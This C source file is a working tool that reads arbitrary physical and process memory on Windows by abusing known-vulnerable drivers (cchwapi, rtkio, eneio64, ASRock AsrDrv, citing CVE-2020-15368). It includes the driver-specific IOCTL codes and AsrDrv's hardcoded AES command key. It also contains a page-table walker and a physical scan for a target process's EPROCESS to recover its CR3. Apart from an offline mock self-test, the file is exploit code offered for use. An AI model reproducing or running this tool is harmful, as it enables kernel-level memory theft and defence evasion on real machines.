// layers.exe - independent three-layer virtual-memory access architecture.
//
//   定位层 (locator)     : obtain CR3 for a target process
//   翻译层 (translator)  : CR3 + VA -> PA using x64 4-level page tables
//   取数层 (fetcher)     : PA -> bytes via a pluggable physical-memory reader
//
// The three layers only meet through explicit structs/interfaces:
//   mb_phys_reader  (取数层 provider)        read(pa, buf, len)
//   mb_layer_translate(reader, cr3, va)      -> pa / page size
//   mb_layer_locate_cr3_*                    -> cr3
//   mb_layer_read_va(reader, cr3, va, ...)   -> bytes (composition)
//
// `--selftest-mock` verifies all three layers offline, with a synthetic physical
// memory containing a page table and a fake EPROCESS; no driver/admin required.
//
// Real 取数层 providers: cchwapi (0x8024003C), rtkio (0x80002000 map), eneio64
// (0x80102040 map); devices must already be loaded/opened (loading policy belongs
// to membridge.exe). More N-day backends can be added behind mb_phys_reader
// without touching locator/translator.
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

// ---------------------------------------------------------------------------
// 取数层 (fetch layer): pluggable physical memory reader
// ---------------------------------------------------------------------------
typedef struct mb_phys_reader mb_phys_reader;
struct mb_phys_reader {
    const char *name;
    HANDLE dev;
    int mode;                 // 0 cchwapi, 1 rtkio, 2 eneio64, 3 mock
    uint8_t *mock_mem;
    uint64_t mock_size;
    int (*read)(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size);
};

static int read_cchwapi(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
    if (r->dev == INVALID_HANDLE_VALUE) return 0;
    uint32_t len = size + 0x14;
    uint8_t *b = (uint8_t *)malloc(len);
    if (!b) return 0;
    memset(b, 0, len);
    *(uint64_t *)(b + 8) = pa;
    *(uint32_t *)(b + 0x10) = size;
    DWORD ret = 0;
    BOOL ok = FALSE;
    for (int attempt = 0; attempt < 3 && !ok; attempt++) {
        ok = DeviceIoControl(r->dev, 0x8024003Cu, b, len, b, len, &ret, NULL);
        if (!ok) Sleep(30);
    }
    if (ok) memcpy(buf, b + 0x14, size);
    free(b);
    return ok ? 1 : 0;
}

static int read_rtkio(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
    if (r->dev == INVALID_HANDLE_VALUE) return 0;
    uint64_t page = pa & ~0xFFFull;
    uint32_t off = (uint32_t)(pa & 0xFFF);
    uint32_t map_size = (off + size + 0xFFF) & ~0xFFFu;
    uint8_t in[16];
    uint64_t uva = 0;
    DWORD ret = 0;
    memset(in, 0, sizeof(in));
    *(uint64_t *)(in + 0) = page;
    *(uint32_t *)(in + 8) = map_size;
    if (!DeviceIoControl(r->dev, 0x80002000u, in, sizeof(in), &uva, sizeof(uva), &ret, NULL) || !uva)
        return 0;
    SIZE_T got = 0;
    return (ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(uintptr_t)(uva + off), buf, size, &got) &&
            got == size) ? 1 : 0;
}

static int read_eneio64(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
    if (r->dev == INVALID_HANDLE_VALUE) return 0;
    uint8_t in[40], out[40];
    DWORD ret = 0;
    memset(in, 0, sizeof(in));
    memset(out, 0, sizeof(out));
    *(uint64_t *)(in + 0) = size;
    *(uint64_t *)(in + 8) = pa;
    if (!DeviceIoControl(r->dev, 0x80102040u, in, sizeof(in), out, sizeof(out), &ret, NULL))
        return 0;
    uint64_t cands[3] = { *(uint64_t *)(out + 24), *(uint64_t *)(out + 16), *(uint64_t *)(out + 32) };
    for (int i = 0; i < 3; i++) {
        if (cands[i] < 0x10000) continue;
        SIZE_T got = 0;
        if (ReadProcessMemory(GetCurrentProcess(), (LPCVOID)(uintptr_t)cands[i], buf, size, &got) &&
            got == size)
            return 1;
    }
    return 0;
}

static int read_mock(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
    if (!r->mock_mem || pa > r->mock_size || size > r->mock_size - pa) return 0;
    memcpy(buf, r->mock_mem + pa, size);
    return 1;
}

// ---- 取数层 provider: ASRock AsrDrv(2).sys (CVE-2020-15368 family) ----
// Outer IOCTL 0x22EC00 with AES-256-CBC payload; opcode 0x22E808 = physical read.
#pragma pack(push, 1)
typedef struct { WORD pad; DWORD iv_size; BYTE iv[21]; BYTE key[16]; BYTE pad2[3]; } asr_hdr;
typedef struct { DWORD cmd_size; WORD pad; } asr_footer;
typedef union { BYTE c[24]; WORD w[12]; DWORD d[6]; UINT64 q[3]; } asr_args;
typedef struct { UINT opcode; int pad; asr_args args; } asr_cmd;
#pragma pack(pop)

static int asr_encrypt(const asr_cmd *cmd, BYTE **out_buf, DWORD *out_len) {
    asr_hdr hdr;
    memset(&hdr, 0, sizeof(hdr));
    memset(hdr.iv, 0x69, sizeof(hdr.iv));
    memset(hdr.key, 0x69, sizeof(hdr.key));
    hdr.iv_size = sizeof(hdr.iv);
    BYTE enc_key[32];
    memset(enc_key, 0, sizeof(enc_key));
    memcpy(enc_key, "C110DD4FE9434147B92A5A1E3FDBF29A", 32);
    memcpy(&enc_key[13], hdr.key, 16);

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) < 0) return 0;
    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, enc_key, sizeof(enc_key), 0) < 0) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return 0;
    }
    BYTE cipher[128];
    ULONG cb = 0;
    BYTE iv[16];
    memcpy(iv, hdr.iv, sizeof(iv));
    NTSTATUS st = BCryptEncrypt(hKey, (PUCHAR)cmd, sizeof(*cmd), NULL, iv, sizeof(iv),
                                cipher, sizeof(cipher), &cb, BCRYPT_BLOCK_PADDING);
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    if (st < 0) return 0;
    DWORD total = (DWORD)(sizeof(hdr) + cb + sizeof(asr_footer));
    BYTE *b = (BYTE *)calloc(1, total);
    if (!b) return 0;
    memcpy(b, &hdr, sizeof(hdr));
    memcpy(b + sizeof(hdr), cipher, cb);
    asr_footer *f = (asr_footer *)(b + total - sizeof(asr_footer));
    f->cmd_size = cb;
    *out_buf = b;
    *out_len = total;
    return 1;
}

static int read_asrdrv(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
    asr_cmd cmd;
    memset(&cmd, 0, sizeof(cmd));
    cmd.opcode = 0x22E808u;                 // OPCODE_READ_PHYSMEM
    cmd.args.q[0] = pa;
    cmd.args.d[2] = size;                   // length
    cmd.args.d[3] = 0;                      // byte granularity
    cmd.args.q[2] = (UINT64)(uintptr_t)buf; // driver writes to this user buffer
    BYTE *in = NULL;
    DWORD inlen = 0;
    if (!asr_encrypt(&cmd, &in, &inlen)) return 0;
    BYTE out[0x40];
    DWORD ret = 0;
    BOOL ok = DeviceIoControl(r->dev, 0x22EC00u, in, inlen, out, sizeof(out), &ret, NULL);
    free(in);
    return ok ? 1 : 0;
}

static int reader_open(mb_phys_reader *r, const char *kind, const char *device) {
    memset(r, 0, sizeof(*r));
    r->dev = INVALID_HANDLE_VALUE;
    if (_stricmp(kind, "mock") == 0) {
        r->name = "mock";
        r->mode = 3;
        r->read = read_mock;
        return 1;
    }
    if (_stricmp(kind, "cchwapi") == 0) {
        r->name = "cchwapi";
        r->mode = 0;
        r->read = read_cchwapi;
        r->dev = CreateFileA(device ? device : "\\\\.\\CCHWAPI",
                             GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    } else if (_stricmp(kind, "rtkio") == 0) {
        r->name = "rtkio";
        r->mode = 1;
        r->read = read_rtkio;
        r->dev = CreateFileA(device ? device : "\\\\.\\rtkio",
                             GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    } else if (_stricmp(kind, "eneio64") == 0) {
        r->name = "eneio64";
        r->mode = 2;
        r->read = read_eneio64;
        r->dev = CreateFileA(device ? device : "\\\\.\\GLCKIo",
                             GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    } else if (_stricmp(kind, "asrdrv") == 0) {
        r->name = "asrdrv";
        r->mode = 4;
        r->read = read_asrdrv;
        const char *names[] = { device, "\\\\.\\AsrDrv109", "\\\\.\\GlobalRoot\\Device\\AsrDrv109",
                                "\\\\.\\Global\\AsrDrv109", "\\\\.\\GlobalRoot\\Device\\AsrDrv104" };
        for (int i = 0; i < (int)(sizeof(names) / sizeof(names[0])) && r->dev == INVALID_HANDLE_VALUE; i++) {
            if (!names[i] || !names[i][0]) continue;
            r->dev = CreateFileA(names[i], GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL, OPEN_EXISTING, 0, NULL);
        }
    } else {
        fprintf(stderr, "[ERR] unknown reader '%s' (mock|cchwapi|rtkio|eneio64|asrdrv)\n", kind ? kind : "");
        return 0;
    }
    if (r->dev == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[ERR] CreateFile(%s) failed err=%lu\n", device ? device : r->name, GetLastError());
        return 0;
    }
    return 1;
}

static void reader_close(mb_phys_reader *r) {
    if (r->dev != INVALID_HANDLE_VALUE && r->dev) CloseHandle(r->dev);
    r->dev = INVALID_HANDLE_VALUE;
    r->mock_mem = NULL;
}

// ---------------------------------------------------------------------------
// 翻译层 (translation layer): CR3 + VA -> PA, 4-level x64 page tables
// ---------------------------------------------------------------------------
#define MB_MAX_PHYS 0x10000000000ull   // 1 TiB sanity limit
#define MB_KVA_MIN  0xFFFF800000000000ull

static int phys_read_u64(mb_phys_reader *r, uint64_t pa, uint64_t *out) {
    if (pa >= MB_MAX_PHYS) return 0;
    return r->read(r, pa, out, 8);
}

// returns 1 on success; out_pa = physical address of VA, out_page_size = 0x1000/0x200000/0x40000000
static int mb_layer_translate(mb_phys_reader *r, uint64_t cr3, uint64_t va,
                              uint64_t *out_pa, uint64_t *out_page_size) {
    uint64_t e = 0;
    uint64_t pml4 = cr3 & 0x000FFFFFFFFFF000ull;
    if (!phys_read_u64(r, pml4 + (((va >> 39) & 0x1FF) * 8), &e) || !(e & 1)) return 0;
    uint64_t pdpt = e & 0x000FFFFFFFFFF000ull;
    if (!phys_read_u64(r, pdpt + (((va >> 30) & 0x1FF) * 8), &e) || !(e & 1)) return 0;
    if (e & 0x80) {
        *out_pa = (e & 0x000FFFFFC0000000ull) + (va & 0x3FFFFFFFull);
        *out_page_size = 0x40000000ull;
        return (*out_pa < MB_MAX_PHYS);
    }
    uint64_t pd = e & 0x000FFFFFFFFFF000ull;
    if (!phys_read_u64(r, pd + (((va >> 21) & 0x1FF) * 8), &e) || !(e & 1)) return 0;
    if (e & 0x80) {
        *out_pa = (e & 0x000FFFFFFFE00000ull) + (va & 0x1FFFFFull);
        *out_page_size = 0x200000ull;
        return (*out_pa < MB_MAX_PHYS);
    }
    uint64_t pt = e & 0x000FFFFFFFFFF000ull;
    if (!phys_read_u64(r, pt + (((va >> 12) & 0x1FF) * 8), &e) || !(e & 1)) return 0;
    *out_pa = (e & 0x000FFFFFFFFFF000ull) + (va & 0xFFFull);
    *out_page_size = 0x1000;
    return (*out_pa < MB_MAX_PHYS);
}

// ---------------------------------------------------------------------------
// 定位层 (locator): target process -> CR3
// ---------------------------------------------------------------------------
// Known Win11 26200 _EPROCESS offsets (validated in earlier rounds):
#define EP_DTB     0x28ull
#define EP_PID     0x1D0ull
#define EP_NAME    0x338ull

static int mb_layer_locate_cr3_explicit(uint64_t cr3, uint64_t *out_cr3) {
    if (!cr3 || (cr3 & 0xFFF)) return 0;
    *out_cr3 = cr3;
    return 1;
}

// Physical-scan locator: independent from any kernel-VA reader. Scans a physical
// range for an EPROCESS whose PID and ImageFileName match, then reads
// DirectoryTableBase (+0x28). This is the locator strategy that only needs the
// 取数层 reader.
static int mb_layer_locate_cr3_scan(mb_phys_reader *r, uint64_t range_start, uint64_t range_size,
                                    uint32_t pid, const char *image_name,
                                    uint64_t *out_cr3, uint64_t *out_eproc_pa) {
    const uint32_t chunk = 0x100000;
    if (range_size < 0x1000) return 0;
    uint8_t *buf = (uint8_t *)malloc(chunk);
    if (!buf) return 0;
    uint8_t name[15];
    memset(name, 0, sizeof(name));
    size_t nlen = strlen(image_name);
    if (nlen > 15) nlen = 15;
    memcpy(name, image_name, nlen);

    uint64_t end = range_start + range_size;
    int found = 0;
    for (uint64_t pa = range_start; pa < end && !found; pa += chunk) {
        uint32_t want = (uint32_t)((end - pa) < chunk ? (end - pa) : chunk);
        if (want < 0x1000) break;
        if (!r->read(r, pa, buf, want)) continue;
        for (uint32_t off = 0; off + EP_NAME + 2 <= want; off++) {
            if (memcmp(buf + off, name, nlen) != 0) continue;
            if (off < EP_NAME) continue;
            uint64_t base_off = off - EP_NAME;
            if (base_off + EP_DTB + 8 > want) continue;
            uint64_t dtb = 0;
            uint32_t pid_v = 0;
            memcpy(&dtb, buf + base_off + EP_DTB, 8);
            memcpy(&pid_v, buf + base_off + EP_PID, 4);
            if (pid_v != pid) continue;
            if (!dtb || (dtb & 0xFFF) || dtb >= MB_MAX_PHYS) continue;
            *out_cr3 = dtb;
            if (out_eproc_pa) *out_eproc_pa = pa + base_off;
            found = 1;
            break;
        }
    }
    free(buf);
    return found;
}

// ---------------------------------------------------------------------------
// 定位层辅助：从注册表读取物理内存范围（HARDWARE\RESOURCEMAP\...\Physical Memory）
// 这样物理扫描 locator 不需要用户手工提供范围，也不需要内核读驱动。
// ---------------------------------------------------------------------------
typedef struct { uint64_t start; uint64_t length; } mb_range;

static int mb_phys_ranges_from_registry(mb_range *out, int max) {
    HKEY key;
    LONG e = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                      L"HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
                      0, KEY_READ, &key);
    if (e != ERROR_SUCCESS) {
        fprintf(stderr, "[DBG] RegOpenKeyEx failed err=%ld\n", (long)e);
        return 0;
    }
    DWORD type = 0, size = 0;
    e = RegQueryValueExW(key, L".Translated", NULL, &type, NULL, &size);
    if (e != ERROR_SUCCESS) {
        fprintf(stderr, "[DBG] RegQueryValueEx size failed err=%ld type=%lu size=%lu\n",
                (long)e, (unsigned long)type, (unsigned long)size);
        RegCloseKey(key);
        return 0;
    }
    if (size < 16) {
        fprintf(stderr, "[DBG] registry value too small size=%lu type=%lu\n",
                (unsigned long)size, (unsigned long)type);
        RegCloseKey(key);
        return 0;
    }
    BYTE *data = (BYTE *)malloc(size);
    if (!data) { RegCloseKey(key); return 0; }
    DWORD got = size;
    e = RegQueryValueExW(key, L".Translated", NULL, &type, data, &got);
    if (e != ERROR_SUCCESS) {
        fprintf(stderr, "[DBG] RegQueryValueEx data failed err=%ld got=%lu\n", (long)e, (unsigned long)got);
        free(data);
        RegCloseKey(key);
        return 0;
    }
    RegCloseKey(key);
    if (got < 16) { fprintf(stderr, "[DBG] data too small got=%lu\n", (unsigned long)got); free(data); return 0; }

    uint32_t count = *(uint32_t *)(data + 0);
    uint32_t off = 8;                 // Count + 4-byte alignment padding
    int n = 0;
    for (uint32_t i = 0; i < count && off + 12 <= got && n < max; i++) {
        off += 8;                     // InterfaceType + BusNumber
        uint32_t parts = *(uint32_t *)(data + off);
        off += 4;
        for (uint32_t j = 0; j < parts && off + 20 <= got && n < max; j++) {
            uint8_t dtype = data[off];
            uint16_t flags = *(uint16_t *)(data + off + 2);
            uint64_t start = *(uint64_t *)(data + off + 4);
            uint32_t len = *(uint32_t *)(data + off + 12);
            off += 20;
            if ((dtype != 3 && dtype != 7) || !len) continue;  // 3 = Memory, 7 = MemoryLarge
            uint64_t L = len;
            if (flags & 0x200) L <<= 8;
            else if (flags & 0x400) L <<= 16;
            else if (flags & 0x800) L <<= 32;
            out[n].start = start;
            out[n].length = L;
            n++;
        }
    }
    free(data);
    return n;
}

// ---------------------------------------------------------------------------
// Composition: 定位 + 翻译 + 取数
// ---------------------------------------------------------------------------
static int mb_layer_read_va(mb_phys_reader *r, uint64_t cr3, uint64_t va,
                            void *out, uint32_t size) {
    uint32_t done = 0;
    while (done < size) {
        uint64_t cur = va + done;
        uint64_t pa = 0, page = 0;
        if (!mb_layer_translate(r, cr3, cur, &pa, &page)) {
            fprintf(stderr, "[ERR] translate failed VA=0x%llX\n", (unsigned long long)cur);
            return 0;
        }
        uint32_t page_off = (uint32_t)(cur & 0xFFF);
        uint32_t chunk = size - done;
        if (chunk > 0x1000 - page_off) chunk = 0x1000 - page_off;
        if (!r->read(r, pa, (uint8_t *)out + done, chunk)) {
            fprintf(stderr, "[ERR] fetch failed PA=0x%llX\n", (unsigned long long)pa);
            return 0;
        }
        done += chunk;
    }
    return 1;
}

// ---------------------------------------------------------------------------
// Offline self-test: synthetic physical memory + page tables + fake EPROCESS
// ---------------------------------------------------------------------------
static int g_fail = 0;
static void check(const char *layer, const char *what, int ok) {
    printf("[%s] %s: %s\n", ok ? "PASS" : "FAIL", layer, what);
    if (!ok) g_fail++;
}

static int selftest_mock(void) {
    printf("== membridge layers offline self-test (mock physical memory) ==\n");
    const uint64_t mem_size = 0x200000;
    uint8_t *mem = (uint8_t *)calloc(1, mem_size);
    if (!mem) return 2;

    // 4-level page tables: VA 0x400000 -> PA 0x5000
    const uint64_t cr3 = 0x1000;
    *(uint64_t *)(mem + 0x1000 + 0 * 8) = 0x2003;          // PML4[0]
    *(uint64_t *)(mem + 0x2000 + 0 * 8) = 0x3003;          // PDPT[0]
    *(uint64_t *)(mem + 0x3000 + 2 * 8) = 0x4003;          // PD[2]
    *(uint64_t *)(mem + 0x4000 + 0 * 8) = 0x5003;          // PT[0]
    const char *data = "MEMBRIDGE_LAYERS_MOCK_DATA_0123456789";
    memcpy(mem + 0x5000, data, strlen(data));

    // fake EPROCESS at PA 0x8000: name @+0x338, PID @+0x1D0, DTB @+0x28
    memcpy(mem + 0x8000 + EP_NAME, "MOCK.exe", 9);
    *(uint32_t *)(mem + 0x8000 + EP_PID) = 4242;
    *(uint64_t *)(mem + 0x8000 + EP_DTB) = cr3;

    mb_phys_reader r;
    memset(&r, 0, sizeof(r));
    r.name = "mock";
    r.mode = 3;
    r.read = read_mock;
    r.mock_mem = mem;
    r.mock_size = mem_size;

    // 取数层 alone
    uint8_t got[64];
    memset(got, 0, sizeof(got));
    int ok_fetch = r.read(&r, 0x5000, got, (uint32_t)strlen(data)) && memcmp(got, data, strlen(data)) == 0;
    check("取数层(fetcher)", "PA=0x5000 bytes match mock data", ok_fetch);

    // 翻译层 alone
    uint64_t pa = 0, page = 0;
    int ok_tr = mb_layer_translate(&r, cr3, 0x400000, &pa, &page) && pa == 0x5000 && page == 0x1000;
    check("翻译层(translator)", "VA=0x400000 -> PA=0x5000 (4KB page)", ok_tr);
    uint64_t pa2 = 0, page2 = 0;
    int ok_tr2 = mb_layer_translate(&r, cr3, 0x400010, &pa2, &page2) && pa2 == 0x5010;
    check("翻译层(translator)", "VA=0x400010 -> PA=0x5010 (offset preserved)", ok_tr2);

    // 定位层 alone (physical EPROCESS scan, no kernel reader)
    uint64_t located_cr3 = 0, eproc = 0;
    int ok_loc = mb_layer_locate_cr3_scan(&r, 0x8000, 0x1000, 4242, "MOCK.exe",
                                          &located_cr3, &eproc) && located_cr3 == cr3;
    check("定位层(locator)", "PID 4242 / MOCK.exe -> CR3=0x1000 (physical scan)", ok_loc);
    check("定位层(locator)", "fake EPROCESS PA=0x8000", ok_loc && eproc == 0x8000);

    // full pipeline: locate -> translate -> fetch
    uint64_t cr3b = 0;
    uint8_t pipe[64];
    memset(pipe, 0, sizeof(pipe));
    int ok_pipe = mb_layer_locate_cr3_scan(&r, 0x8000, 0x1000, 4242, "MOCK.exe", &cr3b, NULL) &&
                  mb_layer_read_va(&r, cr3b, 0x400000, pipe, (uint32_t)strlen(data)) &&
                  memcmp(pipe, data, strlen(data)) == 0;
    check("三层组合(pipeline)", "locate -> translate -> fetch returns mock data", ok_pipe);

    // independence checks: translator works with explicit CR3 and no locator;
    // fetcher works with a raw PA and no translator.
    uint8_t raw[16];
    memset(raw, 0, sizeof(raw));
    int ok_indep1 = r.read(&r, 0x5000, raw, 16) && memcmp(raw, data, 16) == 0;
    uint64_t pa3 = 0, page3 = 0;
    int ok_indep2 = mb_layer_translate(&r, 0x1000, 0x400000, &pa3, &page3);
    check("独立性(independence)", "取数层 usable without locator/translator", ok_indep1);
    check("独立性(independence)", "翻译层 usable without locator", ok_indep2);

    free(mem);
    printf("VERDICT=%s\n", g_fail ? "FAIL" : "PASS");
    return g_fail ? 1 : 0;
}

// ---------------------------------------------------------------------------
// CLI
// ---------------------------------------------------------------------------
static void usage(void) {
    printf("layers - independent 定位层 / 翻译层 / 取数层 architecture\n");
    printf("Usage:\n");
    printf("  layers --selftest-mock\n");
    printf("  layers --ranges                       (read physical RAM ranges from registry)\n");
    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv> [--device <path>] --read-phys --pa <hex> --size <n>\n");
    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv> [--device <path>] --cr3 <hex> --va <hex> --size <n>\n");
    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
    printf("  layers --reader ... --locate --pid <pid> (--scan-start/--scan-size | --auto-ranges) --va <hex> --size <n>\n");
}

int main(int argc, char **argv) {
    const char *kind = NULL, *device = NULL, *name = NULL;
    uint64_t pa = 0, cr3 = 0, va = 0, scan_start = 0, scan_size = 0;
    uint32_t size = 0x40, pid = 0;
    int do_selftest = 0, do_read_phys = 0, do_explicit = 0, do_locate = 0, have_cr3 = 0, have_va = 0;
    int do_ranges = 0, auto_ranges = 0;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--selftest-mock") == 0) do_selftest = 1;
        else if (strcmp(argv[i], "--reader") == 0 && i + 1 < argc) kind = argv[++i];
        else if (strcmp(argv[i], "--device") == 0 && i + 1 < argc) device = argv[++i];
        else if (strcmp(argv[i], "--name") == 0 && i + 1 < argc) name = argv[++i];
        else if (strcmp(argv[i], "--pa") == 0 && i + 1 < argc) pa = _strtoui64(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "--cr3") == 0 && i + 1 < argc) { cr3 = _strtoui64(argv[++i], NULL, 0); have_cr3 = 1; }
        else if (strcmp(argv[i], "--va") == 0 && i + 1 < argc) { va = _strtoui64(argv[++i], NULL, 0); have_va = 1; }
        else if (strcmp(argv[i], "--size") == 0 && i + 1 < argc) size = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "--pid") == 0 && i + 1 < argc) pid = (uint32_t)strtoul(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "--scan-start") == 0 && i + 1 < argc) scan_start = _strtoui64(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "--scan-size") == 0 && i + 1 < argc) scan_size = _strtoui64(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "--read-phys") == 0) do_read_phys = 1;
        else if (strcmp(argv[i], "--locate") == 0) do_locate = 1;
        else if (strcmp(argv[i], "--ranges") == 0) do_ranges = 1;
        else if (strcmp(argv[i], "--auto-ranges") == 0) auto_ranges = 1;
        else if (strcmp(argv[i], "--explicit") == 0) do_explicit = 1;
        else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) { usage(); return 0; }
    }
    if (do_selftest) return selftest_mock();
    if (do_ranges) {
        mb_range rs[256];
        int n = mb_phys_ranges_from_registry(rs, 256);
        if (n <= 0) { printf("[ERR] cannot read physical memory ranges from registry\n"); return 5; }
        printf("[OK] %d physical memory ranges (registry HARDWARE\\RESOURCEMAP):\n", n);
        for (int i = 0; i < n; i++)
            printf("  [%2d] 0x%llX - 0x%llX  len=0x%llX\n", i,
                   (unsigned long long)rs[i].start,
                   (unsigned long long)(rs[i].start + rs[i].length),
                   (unsigned long long)rs[i].length);
        printf("VERDICT=PASS\n");
        return 0;
    }
    if (!kind) { usage(); return 6; }

    mb_phys_reader r;
    if (!reader_open(&r, kind, device)) return 3;

    int rc = 0;
    if (do_read_phys) {
        uint8_t *b = (uint8_t *)calloc(1, size);
        if (!b) { rc = 6; goto done; }
        if (!r.read(&r, pa, b, size)) { printf("[ERR] fetch PA=0x%llX failed\n", (unsigned long long)pa); rc = 5; }
        else {
            printf("[OK] read %u bytes at PA=0x%llX\n", size, (unsigned long long)pa);
            for (uint32_t i = 0; i < size; i++) printf("%02X%s", b[i], ((i + 1) % 16 == 0) ? "\n" : " ");
            printf("\nVERDICT=PASS\n");
        }
        free(b);
    } else if (do_locate) {
        uint64_t got_cr3 = 0, eproc = 0;
        if (have_cr3) {
            if (!mb_layer_locate_cr3_explicit(cr3, &got_cr3)) { printf("[ERR] bad explicit CR3\n"); rc = 5; }
            else printf("[OK] 定位层 explicit CR3=0x%llX\n", (unsigned long long)got_cr3);
        } else if (pid && (scan_size || auto_ranges)) {
            if (!name) name = "";
            int ok = 0;
            if (auto_ranges) {
                mb_range rs[256];
                int n = mb_phys_ranges_from_registry(rs, 256);
                printf("[OK] locator: %d physical ranges from registry\n", n);
                for (int i = 0; i < n && !ok; i++) {
                    if (rs[i].length < 0x1000) continue;
                    ok = mb_layer_locate_cr3_scan(&r, rs[i].start, rs[i].length, pid, name,
                                                  &got_cr3, &eproc);
                }
            } else {
                ok = mb_layer_locate_cr3_scan(&r, scan_start, scan_size, pid, name,
                                              &got_cr3, &eproc);
            }
            if (!ok) {
                printf("[ERR] 定位层 scan failed (pid=%u name='%s')\n", pid, name);
                rc = 5;
            } else {
                printf("[OK] 定位层 scan: PID=%u EPROCESS_PA=0x%llX CR3=0x%llX\n", pid,
                       (unsigned long long)eproc, (unsigned long long)got_cr3);
            }
        } else {
            printf("[ERR] locate needs --cr3 or --pid/--scan-start/--scan-size\n");
            rc = 6;
        }
        if (!rc && have_va) {
            uint8_t *b = (uint8_t *)calloc(1, size);
            if (b && mb_layer_read_va(&r, got_cr3, va, b, size)) {
                printf("[OK] 翻译+取数 VA=0x%llX -> %u bytes\n", (unsigned long long)va, size);
                for (uint32_t i = 0; i < size; i++) printf("%02X%s", b[i], ((i + 1) % 16 == 0) ? "\n" : " ");
                printf("\nVERDICT=PASS\n");
            } else { printf("[ERR] read VA failed\n"); rc = 5; }
            free(b);
        }
    } else if (have_cr3 && have_va) {
        uint8_t *b = (uint8_t *)calloc(1, size);
        uint64_t pa_out = 0, page = 0;
        if (!b) { rc = 6; goto done; }
        if (!mb_layer_translate(&r, cr3, va, &pa_out, &page)) {
            printf("[ERR] 翻译层 VA=0x%llX -> PA failed\n", (unsigned long long)va); rc = 5;
        } else {
            printf("[OK] 翻译层 VA=0x%llX -> PA=0x%llX page=0x%llX\n", (unsigned long long)va,
                   (unsigned long long)pa_out, (unsigned long long)page);
            if (!mb_layer_read_va(&r, cr3, va, b, size)) { printf("[ERR] 取数层 failed\n"); rc = 5; }
            else {
                printf("[OK] bytes:\n");
                for (uint32_t i = 0; i < size; i++) printf("%02X%s", b[i], ((i + 1) % 16 == 0) ? "\n" : " ");
                printf("\nVERDICT=PASS\n");
            }
        }
        free(b);
    } else {
        usage();
        rc = 6;
    }
done:
    reader_close(&r);
    return rc;
}
